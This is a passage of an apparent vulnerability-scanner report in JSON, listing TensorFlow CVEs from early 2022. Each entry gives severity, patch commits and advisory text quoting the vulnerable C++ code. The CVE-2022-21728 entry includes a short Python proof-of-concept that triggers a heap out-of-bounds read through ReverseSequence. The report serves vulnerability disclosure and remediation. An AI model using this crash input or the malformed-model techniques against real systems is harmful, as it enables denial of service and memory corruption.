              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-23582",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23582"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23582",
              "help": {
                "text": "Vulnerability CVE-2022-23582\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23582](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23582)\n### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [`TensorByteSize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/attr_value_util.cc#L46-L50) would trigger `CHECK` failures.\n\n```cc\nint64_t TensorByteSize(const TensorProto\u0026 t) {\n  // num_elements returns -1 if shape is not fully defined.\n  int64_t num_elems = TensorShape(t.tensor_shape()).num_elements();\n  return num_elems \u003c 0 ? -1 : num_elems * DataTypeSize(t.dtype());\n}\n```\n`TensorShape` constructor throws a `CHECK`-fail if shape is partial or has a number of elements that would overflow the size of an `int`. The `PartialTensorShape` constructor instead does not cause a `CHECK`-abort if the shape is partial, which is exactly what this function needs to be able to return `-1`.\n\n### Patches\nWe have patched the issue in GitHub commit [c2426bba00a01de6913738df8fa78e0215fcce02](https://github.com/tensorflow/tensorflow/commit/c2426bba00a01de6913738df8fa78e0215fcce02).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23582**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23582](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23582)|\n\n### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [`TensorByteSize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/attr_value_util.cc#L46-L50) would trigger `CHECK` failures.\n\n```cc\nint64_t TensorByteSize(const TensorProto\u0026 t) {\n  // num_elements returns -1 if shape is not fully defined.\n  int64_t num_elems = TensorShape(t.tensor_shape()).num_elements();\n  return num_elems \u003c 0 ? -1 : num_elems * DataTypeSize(t.dtype());\n}\n```\n`TensorShape` constructor throws a `CHECK`-fail if shape is partial or has a number of elements that would overflow the size of an `int`. The `PartialTensorShape` constructor instead does not cause a `CHECK`-abort if the shape is partial, which is exactly what this function needs to be able to return `-1`.\n\n### Patches\nWe have patched the issue in GitHub commit [c2426bba00a01de6913738df8fa78e0215fcce02](https://github.com/tensorflow/tensorflow/commit/c2426bba00a01de6913738df8fa78e0215fcce02).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-23589",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23589"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23589",
              "help": {
                "text": "Vulnerability CVE-2022-23589\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23589](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23589)\n### Impact\nUnder certain scenarios, Grappler component of TensorFlow can trigger a null pointer dereference. There are 2 places where this can occur, for the same malicious alteration of a `SavedModel` file (fixing the first one would trigger the same dereference in the second place):\n\nFirst, during [constant folding](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L3466-L3497), the `GraphDef` might not have the required nodes for the binary operation:\n\n```cc\n  NodeDef* mul_left_child = node_map_-\u003eGetNode(node-\u003einput(0));\n  NodeDef* mul_right_child = node_map_-\u003eGetNode(node-\u003einput(1));\n  // One child must be constant, and the second must be Conv op.\n  const bool left_child_is_constant = IsReallyConstant(*mul_left_child);\n  const bool right_child_is_constant = IsReallyConstant(*mul_right_child);\n```\n\nIf a node is missing, the correposning `mul_*child` would be null, and the dereference in the subsequent line would be incorrect.\n\nWe have a similar issue during [`IsIdentityConsumingSwitch`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/mutable_graph_view.cc#L59-L74):\n\n```cc\n  NodeDef* input_node = graph.GetNode(tensor_id.node());\n  return IsSwitch(*input_node);\n```\n\n### Patches\nWe have patched the issue in GitHub commits [0a365c029e437be0349c31f8d4c9926b69fa3fa1](https://github.com/tensorflow/tensorflow/commit/0a365c029e437be0349c31f8d4c9926b69fa3fa1) and [045deec1cbdebb27d817008ad5df94d96a08b1bf](https://github.com/tensorflow/tensorflow/commit/045deec1cbdebb27d817008ad5df94d96a08b1bf).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23589**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23589](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23589)|\n\n### Impact\nUnder certain scenarios, Grappler component of TensorFlow can trigger a null pointer dereference. There are 2 places where this can occur, for the same malicious alteration of a `SavedModel` file (fixing the first one would trigger the same dereference in the second place):\n\nFirst, during [constant folding](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L3466-L3497), the `GraphDef` might not have the required nodes for the binary operation:\n\n```cc\n  NodeDef* mul_left_child = node_map_-\u003eGetNode(node-\u003einput(0));\n  NodeDef* mul_right_child = node_map_-\u003eGetNode(node-\u003einput(1));\n  // One child must be constant, and the second must be Conv op.\n  const bool left_child_is_constant = IsReallyConstant(*mul_left_child);\n  const bool right_child_is_constant = IsReallyConstant(*mul_right_child);\n```\n\nIf a node is missing, the correposning `mul_*child` would be null, and the dereference in the subsequent line would be incorrect.\n\nWe have a similar issue during [`IsIdentityConsumingSwitch`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/mutable_graph_view.cc#L59-L74):\n\n```cc\n  NodeDef* input_node = graph.GetNode(tensor_id.node());\n  return IsSwitch(*input_node);\n```\n\n### Patches\nWe have patched the issue in GitHub commits [0a365c029e437be0349c31f8d4c9926b69fa3fa1](https://github.com/tensorflow/tensorflow/commit/0a365c029e437be0349c31f8d4c9926b69fa3fa1) and [045deec1cbdebb27d817008ad5df94d96a08b1bf](https://github.com/tensorflow/tensorflow/commit/045deec1cbdebb27d817008ad5df94d96a08b1bf).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-23564",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23564"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23564",
              "help": {
                "text": "Vulnerability CVE-2022-23564\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23564](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23564)\n### Impact\nWhen decoding a resource handle tensor from protobuf, a TensorFlow process can encounter cases where a `CHECK` assertion is invalidated based on user controlled arguments. This allows attackers to cause denial of services in TensorFlow processes.\n\n### Patches\nWe have patched the issue in GitHub commit [14fea662350e7c26eb5fe1be2ac31704e5682ee6](https://github.com/tensorflow/tensorflow/commit/14fea662350e7c26eb5fe1be2ac31704e5682ee6).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23564**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23564](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23564)|\n\n### Impact\nWhen decoding a resource handle tensor from protobuf, a TensorFlow process can encounter cases where a `CHECK` assertion is invalidated based on user controlled arguments. This allows attackers to cause denial of services in TensorFlow processes.\n\n### Patches\nWe have patched the issue in GitHub commit [14fea662350e7c26eb5fe1be2ac31704e5682ee6](https://github.com/tensorflow/tensorflow/commit/14fea662350e7c26eb5fe1be2ac31704e5682ee6).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23563",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23563"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23563",
              "help": {
                "text": "Vulnerability CVE-2022-23563\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23563](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23563)\n### Impact\nIn multiple places, TensorFlow uses `tempfile.mktemp` to create temporary files. While this is acceptable in testing, in utilities and libraries it is dangerous as a different process can create the file between the check for the filename in `mktemp` and the actual creation of the file by a subsequent operation (a TOC/TOU type of weakness).\n\nIn several instances, TensorFlow was supposed to actually create a temporary directory instead of a file. This logic bug is hidden away by the `mktemp` function usage.\n\n### Patches\nWe have patched the issue in several commits, replacing `mktemp` with the safer `mkstemp`/`mkdtemp` functions, according to the usage pattern.\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported on huntr.dev for one scenario and discovered via variant analysis on other instances.",
                "markdown": "**Vulnerability CVE-2022-23563**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23563](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23563)|\n\n### Impact\nIn multiple places, TensorFlow uses `tempfile.mktemp` to create temporary files. While this is acceptable in testing, in utilities and libraries it is dangerous as a different process can create the file between the check for the filename in `mktemp` and the actual creation of the file by a subsequent operation (a TOC/TOU type of weakness).\n\nIn several instances, TensorFlow was supposed to actually create a temporary directory instead of a file. This logic bug is hidden away by the `mktemp` function usage.\n\n### Patches\nWe have patched the issue in several commits, replacing `mktemp` with the safer `mkstemp`/`mkdtemp` functions, according to the usage pattern.\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported on huntr.dev for one scenario and discovered via variant analysis on other instances."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23583",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23583"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23583",
              "help": {
                "text": "Vulnerability CVE-2022-23583\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23583](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23583)\n### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [any binary op](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/cwise_ops_common.h#L88-L137) would trigger `CHECK` failures. This occurs when the protobuf part corresponding to the tensor arguments is modified such that the `dtype` no longer matches the `dtype` expected by the op. In that case, calling the templated binary operator for the binary op would receive corrupted data, due to the type confusion involved:\n\n```cc\nfunctor::BinaryFunctor\u003cDevice, Functor, 1\u003e()(\n    eigen_device, out-\u003etemplate flat\u003cTout\u003e(),\n    input_0.template flat\u003cTin\u003e(), input_1.template flat\u003cTin\u003e(),\n    error_ptr);\n```\nIf `Tin` and `Tout` don`t match the type of data in `out` and `input_*` tensors then `flat\u003c*\u003e` would interpret it wrongly. In most cases, this would be a silent failure, but we have noticed scenarios where this results in a `CHECK` crash, hence a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9](https://github.com/tensorflow/tensorflow/commit/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23583**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23583](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23583)|\n\n### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [any binary op](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/cwise_ops_common.h#L88-L137) would trigger `CHECK` failures. This occurs when the protobuf part corresponding to the tensor arguments is modified such that the `dtype` no longer matches the `dtype` expected by the op. In that case, calling the templated binary operator for the binary op would receive corrupted data, due to the type confusion involved:\n\n```cc\nfunctor::BinaryFunctor\u003cDevice, Functor, 1\u003e()(\n    eigen_device, out-\u003etemplate flat\u003cTout\u003e(),\n    input_0.template flat\u003cTin\u003e(), input_1.template flat\u003cTin\u003e(),\n    error_ptr);\n```\nIf `Tin` and `Tout` don`t match the type of data in `out` and `input_*` tensors then `flat\u003c*\u003e` would interpret it wrongly. In most cases, this would be a silent failure, but we have noticed scenarios where this results in a `CHECK` crash, hence a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9](https://github.com/tensorflow/tensorflow/commit/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-21741",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21741"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21741",
              "help": {
                "text": "Vulnerability CVE-2022-21741\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21741](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21741)\n### Impact \nAn attacker can craft a TFLite model that would trigger a division by zero in [the implementation of depthwise convolutions](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/lite/kernels/depthwise_conv.cc#L96).\n\nThe parameters of the convolution can be user controlled and are also used within a division operation to determine the size of the padding that needs to be added before applying the convolution. There is no check before this division that the divisor is stricly positive.\n\n### Patches              \nWe have patched the issue in GitHub commit [e5b0eec199c2d03de54fd6a7fd9275692218e2bc](https://github.com/tensorflow/tensorflow/commit/e5b0eec199c2d03de54fd6a7fd9275692218e2bc).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-21741**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21741](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21741)|\n\n### Impact \nAn attacker can craft a TFLite model that would trigger a division by zero in [the implementation of depthwise convolutions](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/lite/kernels/depthwise_conv.cc#L96).\n\nThe parameters of the convolution can be user controlled and are also used within a division operation to determine the size of the padding that needs to be added before applying the convolution. There is no check before this division that the divisor is stricly positive.\n\n### Patches              \nWe have patched the issue in GitHub commit [e5b0eec199c2d03de54fd6a7fd9275692218e2bc](https://github.com/tensorflow/tensorflow/commit/e5b0eec199c2d03de54fd6a7fd9275692218e2bc).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23587",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23587"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23587",
              "help": {
                "text": "Vulnerability CVE-2022-23587\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23587](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23587)\n### Impact\nUnder certain scenarios, Grappler component of TensorFlow is vulnerable to an integer overflow during [cost estimation for crop and resize](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L2621-L2689). Since the cropping parameters are user controlled, a malicious person can trigger undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [0aaaae6eca5a7175a193696383f582f53adab23f](https://github.com/tensorflow/tensorflow/commit/0aaaae6eca5a7175a193696383f582f53adab23f).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23587**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23587](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23587)|\n\n### Impact\nUnder certain scenarios, Grappler component of TensorFlow is vulnerable to an integer overflow during [cost estimation for crop and resize](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L2621-L2689). Since the cropping parameters are user controlled, a malicious person can trigger undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [0aaaae6eca5a7175a193696383f582f53adab23f](https://github.com/tensorflow/tensorflow/commit/0aaaae6eca5a7175a193696383f582f53adab23f).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23561",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23561"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23561",
              "help": {
                "text": "Vulnerability CVE-2022-23561\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23561](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23561)\n### Impact \nAn attacker can craft a TFLite model that would cause a write outside of bounds of an array in TFLite. In fact, the attacker can override the linked list used by the memory allocator. This can be leveraged for an arbitrary write primitive under certain conditions.\n\n### Patches\nWe have patched the issue in GitHub commit [6c0b2b70eeee588591680f5b7d5d38175fd7cdf6](https://github.com/tensorflow/tensorflow/commit/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-23561**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23561](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23561)|\n\n### Impact \nAn attacker can craft a TFLite model that would cause a write outside of bounds of an array in TFLite. In fact, the attacker can override the linked list used by the memory allocator. This can be leveraged for an arbitrary write primitive under certain conditions.\n\n### Patches\nWe have patched the issue in GitHub commit [6c0b2b70eeee588591680f5b7d5d38175fd7cdf6](https://github.com/tensorflow/tensorflow/commit/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21728",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21728"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21728",
              "help": {
                "text": "Vulnerability CVE-2022-21728\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21728](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21728)\n### Impact \nThe [implementation of shape inference for `ReverseSequence`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/ops/array_ops.cc#L1636-L1671) does not fully validate the value of `batch_dim` and can result in a heap OOB read:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.ReverseSequence(\n    input = [`aaa`,`bbb`],\n    seq_lengths = [1,1,1],\n    seq_dim = -10,\n    batch_dim = -10 )\n  return y\n    \ntest()\n```\n\nThere is a check to make sure the value of `batch_dim` does not go over the rank of the input, but there is no check for negative values:\n\n```cc\n  const int32_t input_rank = c-\u003eRank(input);\n  if (batch_dim \u003e= input_rank) {\n    return errors::InvalidArgument( \n        \"batch_dim must be \u003c input rank: \", batch_dim, \" vs. \", input_rank);\n  }\n  // ...\n  \n  DimensionHandle batch_dim_dim = c-\u003eDim(input, batch_dim);\n``` \n    \nNegative dimensions are allowed in some cases to mimic Python`s negative indexing (i.e., indexing from the end of the array), however if the value is too negative then [the implementation of `Dim`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/framework/shape_inference.h#L415-L428) would access elements before the start of an array:\n\n```cc\n  DimensionHandle Dim(ShapeHandle s, int64_t idx) {\n    if (!s.Handle() || s-\u003erank_ == kUnknownRank) {\n      return UnknownDim();\n    }\n    return DimKnownRank(s, idx);\n  } \n·\n  static DimensionHandle DimKnownRank(ShapeHandle s, int64_t idx) {\n    CHECK_NE(s-\u003erank_, kUnknownRank);\n    if (idx \u003c 0) {\n      return s-\u003edims_[s-\u003edims_.size() + idx];\n    }\n    return s-\u003edims_[idx];\n  }\n```\n\n### Patches\nWe have patched the issue in GitHub commit [37c01fb5e25c3d80213060460196406c43d31995](https://github.com/tensorflow/tensorflow/commit/37c01fb5e25c3d80213060460196406c43d31995).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-21728**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21728](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21728)|\n\n### Impact \nThe [implementation of shape inference for `ReverseSequence`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/ops/array_ops.cc#L1636-L1671) does not fully validate the value of `batch_dim` and can result in a heap OOB read:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.ReverseSequence(\n    input = [`aaa`,`bbb`],\n    seq_lengths = [1,1,1],\n    seq_dim = -10,\n    batch_dim = -10 )\n  return y\n    \ntest()\n```\n\nThere is a check to make sure the value of `batch_dim` does not go over the rank of the input, but there is no check for negative values:\n\n```cc\n  const int32_t input_rank = c-\u003eRank(input);\n  if (batch_dim \u003e= input_rank) {\n    return errors::InvalidArgument( \n        \"batch_dim must be \u003c input rank: \", batch_dim, \" vs. \", input_rank);\n  }\n  // ...\n  \n  DimensionHandle batch_dim_dim = c-\u003eDim(input, batch_dim);\n``` \n    \nNegative dimensions are allowed in some cases to mimic Python`s negative indexing (i.e., indexing from the end of the array), however if the value is too negative then [the implementation of `Dim`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/framework/shape_inference.h#L415-L428) would access elements before the start of an array:\n\n```cc\n  DimensionHandle Dim(ShapeHandle s, int64_t idx) {\n    if (!s.Handle() || s-\u003erank_ == kUnknownRank) {\n      return UnknownDim();\n    }\n    return DimKnownRank(s, idx);\n  } \n·\n  static DimensionHandle DimKnownRank(ShapeHandle s, int64_t idx) {\n    CHECK_NE(s-\u003erank_, kUnknownRank);\n    if (idx \u003c 0) {\n      return s-\u003edims_[s-\u003edims_.size() + idx];\n    }\n    return s-\u003edims_[idx];\n  }\n```\n\n### Patches\nWe have patched the issue in GitHub commit [37c01fb5e25c3d80213060460196406c43d31995](https://github.com/tensorflow/tensorflow/commit/37c01fb5e25c3d80213060460196406c43d31995).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported 